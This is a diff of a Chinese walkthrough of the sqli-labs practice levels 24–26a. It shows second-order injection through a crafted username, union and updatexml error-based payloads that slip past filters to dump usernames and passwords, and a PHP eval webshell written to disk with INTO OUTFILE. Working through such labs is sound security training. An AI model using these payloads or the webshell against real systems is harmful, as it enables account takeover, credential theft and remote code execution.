 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>
-
 <p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p>
-<p>这里就存在注入点，$username就是一个很明显的注入点，但是我持有一个username肯定是无法修改这个username，所以我需要注册一个username，在注册时就让username携带一些注释符，就可以修改特定用户的密码了</p>
-<p>这里尝试修改一下admin的密码，我先用Navicat Premium 15查看了一下数据库中users表中的用户数据</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_202845.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_202845.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>这里就存在注入点，$username 就是一个很明显的注入点，但是我持有一个 username 肯定是无法修改这个 username，所以我需要注册一个 username，在注册时就让 username 携带一些注释符，就可以修改特定用户的密码了</p>
+<p>这里尝试修改一下 admin 的密码，我先用 Navicat Premium 15 查看了一下数据库中 users 表中的用户数据</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_202845.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_202845.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>注册</p>
 <p><strong>Desired Username:</strong> admin’#</p>
-<p><strong>Password:</strong> 123 	    </p>
+<p><strong>Password:</strong> 123</p>
 <p>**Retype Password:**123</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203421.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203421.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203421.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203421.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>Register！</p>
-<p>查看users表</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203508.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203508.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>多了一个admin‘# 123</p>
+<p>查看 users 表</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203508.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203508.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>多了一个 admin‘# 123</p>
 <p>登录新注册的账号</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203622.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203622.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>将admin’#的密码改为qwe</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203725.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203725.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203622.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203622.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>将 admin’# 的密码改为 qwe</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203725.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203725.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>update password</p>
 <p>页面显示</p>
 <blockquote>
 <p>Password successfully updated</p>
 </blockquote>
-<p>再次查看users表</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203909.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203909.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>发现admin’#的密码没有改变，admin的密码变成了qwe</p>
+<p>再次查看 users 表</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203909.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_203909.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>发现 admin’# 的密码没有改变，admin 的密码变成了 qwe</p>
 <p>大功告成！</p>
-<p>原理<br>这就是二次注入，它的原理是：</p>
+<p>原理<br>
+这就是二次注入，它的原理是：</p>
 <p>（1）后端（PHP）代码对语句进行了转义</p>
 <p>（2）保存进数据库（mysql）时没有转义，是原语句</p>
 <p>简而言之就是数据库对自己存储的数据非常放心，而用户恰恰向数据库插入了恶意语句。</p>
-<p>解析<br>比如前面所注册的admin ‘#账号，在注册时，后端对其进行了转义（ addslashes() 或者mysql_real_escape_string和mysql_escape_string 等），’#被转义成了其他的东西，所以一次注入无效。<br>但是在保存进数据库的时候，还是admin ‘#。</p>
+<p>解析<br>
+比如前面所注册的 admin ‘# 账号，在注册时，后端对其进行了转义（ addslashes () 或者 mysql_real_escape_string 和 mysql_escape_string 等），’# 被转义成了其他的东西，所以一次注入无效。<br>
+但是在保存进数据库的时候，还是 admin '#。</p>
 <p>那么修改密码时的语句如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set  password=&#x27;123&#x27; where username=&#x27;admin &#x27;#&#x27;</span><br></pre></td></tr></table></figure>
-
-
-<p>所以你以为修改的是admin ‘#的账号，但是数据库理解成要修改密码的账号是admin。</p>
-<p>防范<br>至于如何防范二次注入也很简单：<br>一碗水端平，后端进行了转义，数据库也同样进行转义。</p>
+<p>所以你以为修改的是 admin '# 的账号，但是数据库理解成要修改密码的账号是 admin。</p>
+<p>防范<br>
+至于如何防范二次注入也很简单：<br>
+一碗水端平，后端进行了转义，数据库也同样进行转义。</p>
 <p>原理、解析、防范原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45663905/article/details/107684251">https://blog.csdn.net/weixin_45663905/article/details/107684251</a></p>
-<h2 id="sqli-labs-25"><a href="#sqli-labs-25" class="headerlink" title="sqli-labs-25"></a>sqli-labs-25</h2><p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_154614.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_154614.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h2 id="sqli-labs-25"><a class="markdownIt-Anchor" href="#sqli-labs-25">#</a> sqli-labs-25</h2>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_154614.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_154614.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>最下面的那行英文意思是</p>
 <p><strong>提示：您的输入将被过滤，结果如下：</strong></p>
 <p>图片中说</p>
-<p><strong>您所有的“OR”和“AND”都属于我们</strong></p>
-<p>说明本关过滤了or和and，此时我们需要双写or和and</p>
-<p>另外，过滤的不仅仅是单词or和and还有含这个两个的单词</p>
-<p>比如说order和information之类的</p>
+<p><strong>您所有的 “OR” 和 “AND” 都属于我们</strong></p>
+<p>说明本关过滤了 or 和 and，此时我们需要双写 or 和 and</p>
+<p>另外，过滤的不仅仅是单词 or 和 and 还有含这个两个的单词</p>
+<p>比如说 order 和 information 之类的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;</span><br></pre></td></tr></table></figure>
-
 <p>页面显示</p>
 <blockquote>
-<p>  You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 </p>
+<p>You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1</p>
 </blockquote>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_155125.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_155125.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_155125.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_155125.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>说明本关是单引号闭合</p>
 <p>所以，先猜字段数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; oorrder by 3--+</span><br></pre></td></tr></table></figure>
-
-<p>直到4时页面报错说明时三个字段</p>
+<p>直到 4 时页面报错说明时三个字段</p>
 <p>联合注入查看回显</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; aandnd 1=2 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
-
-<p>2，3回显</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_155425.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_155425.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>2，3 回显</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_155425.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_155425.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>接下来可以直接爆数据了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//获取服务器上所有数据库名称</span><br><span class="line">url?id=1&#x27; aandnd 1=2 union select 1,2,(select group_concat(schema_name) from infoorrmation_schema.schemata)--+</span><br><span class="line">//获取当前数据库</span><br><span class="line">url?id=1&#x27; aandnd 1=2 union select 1,2,(select database())--+</span><br><span class="line">//获取security数据库中所有表名</span><br><span class="line">url?id=1&#x27; aandnd 1=2 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27;)--+</span><br><span class="line">//获取users表中所有列名</span><br><span class="line">url?id=1&#x27; aandnd 1=2 union select 1,2,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; aandnd table_name=&#x27;users&#x27;)--+</span><br><span class="line">//获取users表中所有username和password</span><br><span class="line">?id=1&#x27; aandnd 1=2 union select 1,2,(select group_concat(username,&#x27;^&#x27;,passwoorrd) from users)--+</span><br></pre></td></tr></table></figure>
-
-<p>写入webshell</p>
+<p>写入 webshell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; aandnd 1=2 union select 1,2,&#x27;&lt;?php @eval($_POST[less25]);?&gt;&#x27; into outfile &#x27;D:/phpstudy/www/less25.php&#x27;--+</span><br></pre></td></tr></table></figure>
-
-<h2 id="sqli-labs-25a"><a href="#sqli-labs-25a" class="headerlink" title="sqli-labs-25a"></a>sqli-labs-25a</h2><p>我这里25a的源代码没了，导致我25a关卡没法做</p>
-<p>又去php7靶场下载的地方看了一下<a target="_blank" rel="noopener" href="https://github.com/skyblueee/sqli-labs-php7">https://github.com/skyblueee/sqli-labs-php7</a></p>
-<p>他没有25a这边就只能看一下别人写25a关卡的经验和方法了</p>
-<p>我看了一下标题，还是过滤or和and，应该是大差不差，差距就是25关时单引号闭合</p>
-<p>25a他标题写了整型</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_162409.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_162409.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>看了一下别人做25a题的方法，没有闭合符号直接就可以开始注入了</p>
+<h2 id="sqli-labs-25a"><a class="markdownIt-Anchor" href="#sqli-labs-25a">#</a> sqli-labs-25a</h2>
+<p>我这里 25a 的源代码没了，导致我 25a 关卡没法做</p>
+<p>又去 php7 靶场下载的地方看了一下 https://github.com/skyblueee/sqli-labs-php7</p>
+<p>他没有 25a 这边就只能看一下别人写 25a 关卡的经验和方法了</p>
+<p>我看了一下标题，还是过滤 or 和 and，应该是大差不差，差距就是 25 关时单引号闭合</p>
+<p>25a 他标题写了整型</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_162409.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_162409.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>看了一下别人做 25a 题的方法，没有闭合符号直接就可以开始注入了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?id=1--+</span><br><span class="line">url?id=1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p>其他的payload就不写出来了，我也没有自己做一边，尴尬。。。</p>
-<h2 id="sqli-labs-26"><a href="#sqli-labs-26" class="headerlink" title="sqli-labs-26"></a>sqli-labs-26</h2><p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_162728.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_162728.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>其他的 payload 就不写出来了，我也没有自己做一边，尴尬。。。</p>
+<h2 id="sqli-labs-26"><a class="markdownIt-Anchor" href="#sqli-labs-26">#</a> sqli-labs-26</h2>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_162728.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_162728.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>从图片上就可以看到，他说你所有的空格和注释都会被过滤</p>
-<p>除此之外，and和or也都被过滤了 </p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_210556.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_210556.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_210701.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_210701.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>除此之外，and 和 or 也都被过滤了</p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_210556.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_210556.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_210701.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230112_210701.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>单引号闭合</p>
 <p>这时候我们可以使用报错注入来避开空格的过滤</p>
 <p>查询当前数据库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,(database()),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-
-<p>AND运算符组合N个条件。对于SQL语句执行的操作(无论是事务还是查询)，所有由AND分隔的条件都必须为TRUE。</p>
-<p>对于被过滤的字符，可以使用其他的字符进行替代，<strong>使用 “%a0” 或 “%0b” 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”</strong>。（在本关中我是用%a0和%0b都没办法代替空格，很纳闷）</p>
+<p>AND 运算符组合 N 个条件。对于 SQL 语句执行的操作 (无论是事务还是查询)，所有由 AND 分隔的条件都必须为 TRUE。</p>
+<p>对于被过滤的字符，可以使用其他的字符进行替代，<strong>使用 “% a0” 或 “%0b” 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”</strong>。（在本关中我是用 % a0 和 %0b 都没办法代替空格，很纳闷）</p>
 <blockquote>
-<p><strong>27关回来记录:我是用%a0没有用,%0a才能转译为空格</strong></p>
+<p><strong>27 关回来记录：我是用 % a0 没有用，%0a 才能转译为空格</strong></p>
 </blockquote>
-<p>payload如下：</p>
+<p>payload 如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//获取security数据库中所有表名</span><br><span class="line">url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1</span><br><span class="line">//获取users表中所有列名</span><br><span class="line">url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;)%26%26(table_name=&#x27;users&#x27;)),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1</span><br><span class="line">//获取users表中的所有username和password</span><br><span class="line">url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,substr((select(group_concat(username,&#x27;^&#x27;,passwoorrd))from(users)),1,31),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1</span><br><span class="line">url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,substr((select(group_concat(username,&#x27;^&#x27;,passwoorrd))from(users)),32,63),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1</span><br><span class="line">url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,substr((select(group_concat(username,&#x27;^&#x27;,passwoorrd))from(users)),64,95),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-
-<p>由于limit 0,1没法注释掉，所以这关应该也没法写webshell。</p>
-<p>在学习本关时看到有一个博客是说无法直接从users表中拿数据，我已经拿到了，但是还是记录一下绕过的方法</p>
-<p>方法如下：学习网址<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13940107.html">sqli-labs 通关指南：Less 26 - 乌漆WhiteMoon - 博客园 (cnblogs.com)</a></p>
+<p>由于 limit 0,1 没法注释掉，所以这关应该也没法写 webshell。</p>
+<p>在学习本关时看到有一个博客是说无法直接从 users 表中拿数据，我已经拿到了，但是还是记录一下绕过的方法</p>
+<p>方法如下：学习网址<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13940107.html"> sqli-labs 通关指南：Less 26 - 乌漆 WhiteMoon - 博客园 (cnblogs.com)</a></p>
 <p><strong>获取目标信息</strong></p>
 <p>这里我们无法直接从 users 表拿数据，我们可以先用一个表暂存从 users 表中取出所有数据的查询，然后再从这个暂存的表中取出数据。构造出的 payload 如下，思路就是利用一个查询从另一个查询中取出数据，以此绕过表的限制。注意到 “password” 要使用双写绕过，使用括号来代替空格的划分作用。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-
-<h2 id="sqli-labs-26a"><a href="#sqli-labs-26a" class="headerlink" title="sqli-labs-26a"></a>sqli-labs-26a</h2><p>从界面就可以看到本关过滤了空格和注释</p>
+<h2 id="sqli-labs-26a"><a class="markdownIt-Anchor" href="#sqli-labs-26a">#</a> sqli-labs-26a</h2>
+<p>从界面就可以看到本关过滤了空格和注释</p>
 <p>查看源代码</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_141010.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_141010.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_141010.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_141010.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>注入正常的参数，网页返回对应 id 的正常信息，注入两个单引号分别闭合前后的引号。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_141504.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_141504.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_141504.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_141504.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>网页回显正常的内容，说明该网页存在单引号闭合的字符型注入。</p>
 <p>再测试是否有括号</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)</span><br></pre></td></tr></table></figure>
-
 <p>此时页面无回显信息</p>
 <p>尝试闭合括号</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)aandnd(&#x27;1</span><br></pre></td></tr></table></figure>
-
 <p>此时页面显示正常，说明有使用单层括号来闭合</p>
 <p>由于本关不报错，所以我们只能使用盲注了</p>
-<p>再学习中看到本关能使用union注入，来尝试一下</p>
+<p>再学习中看到本关能使用 union 注入，来尝试一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;)%a0OorRDER%a0BY%a03||(&#x27;1</span><br></pre></td></tr></table></figure>
-
-<p>更改后面的值1，2，3，4页面都没有什么变化</p>
-<p>尝试用union select来判断字段数</p>
+<p>更改后面的值 1，2，3，4 页面都没有什么变化</p>
+<p>尝试用 union select 来判断字段数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=9999&#x27;)%a0UNION%a0SELECT%a01,database(),3%a0||(&#x27;1</span><br></pre></td></tr></table></figure>
-
 <p>页面还是空白</p>
 <p>使用同样的代码却达不到同样的效果，我也不能明白什么情况</p>
-<p>附上学习链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13940107.html#less-26a">sqli-labs 通关指南：Less 26 - 乌漆WhiteMoon - 博客园 (cnblogs.com)</a></p>
-<p>我尝试union注入失败了，还是老老实实的盲注吧</p>
-<p><img src="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_151926.png" class="lazyload" data-srcset="/2023/01/10/sqli-labs-23-26a/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230113_151926.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
